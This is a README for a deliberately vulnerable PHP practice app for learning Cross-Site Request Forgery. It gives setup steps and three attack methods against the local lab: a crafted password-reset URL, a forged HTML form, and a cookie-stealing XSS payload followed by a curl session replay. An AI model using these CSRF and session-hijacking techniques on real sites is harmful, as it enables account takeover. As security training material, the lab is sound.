Web based application to practice CSRF

Development of a web-based application like DVWA to practice Cross-Site Request Forgery (CSRF).

Requirements
	Xampp server
	Web Browser (Mozilla Firefox Recommended)
	Attacker machine (Linux)
	
Getting Started
	Install Xampp.
	In Xampp control panel, start Apache and MySQL.
	In browser, type http://localhost/phpmyadmin/.
	Create a database "user" and table "profile".
	Create columns in the following order: fname, lname, email, password, gender, cont_num (int), age (int), submission, mem_id (int)
	Make email primary key and auto increment mem_id.
	Create a folder in C://xampp/htdocs/csrf.
	Download given files in the above folder.
	Access main page using http://localhost/csrf/index.php
	Create account and log in.
	
	Method 1:
	Change password, through url, for example,
		http://localhost/csrf/pppp.php?new_pass=abcd&re_pass=abcd&re_password=Reset+Password
	
	Method 2:
	View source code of page pppp.php, copy the code into the text editor, save file as filename.html and make the changes as shown:
	
	<form action="http://localhost/csrf/pppp.php?new_pass=&re_pass=&re_password=Reset+Password">
		<dl>
		<dt>
		New Password
		</dt>
		<dd>
		<input type="password" name="new_pass" placeholder="New Password..." value="newpass"  required />
		</dd>
		</dl>
		<dl>
		<dt> 
		Retype New Password
		</dt>
		<dd>
		<input type="password" name="re_pass" placeholder="Retype New Password..." value="newpass" required />
		</dd>
		</dl>
		<p align="center">
		<input type="submit" class="btn" value="Reset Password" name="re_password" />
		</p>
	</form>
	
	Run the html file, and password is changed to newpass.
	
	Method 3:
	Create a local connection to access the website. 
	For firefox,
		View page for uploading composition i.e., upload.php, write "<script>alert(document.cookie)</script>" without quotes to get the Session ID of the user.
	For chrome, 
		Inspect element to get Session ID of the user.
		On linux machine run the following to change password as "newpassword".
curl --cookie "PHPSESSID=userSessionID" --location "serverip/csrf/pppp.phpnew_pass=newpassword&re_pass=newpassword&re_password=Reset+Password" | grep "Password Changed!"
		Password is changed to "newpassword". 
	
License
	This project is licensed under the  GNU GENERAL PUBLIC LICENSE - see the LICENSE.md file for details
	
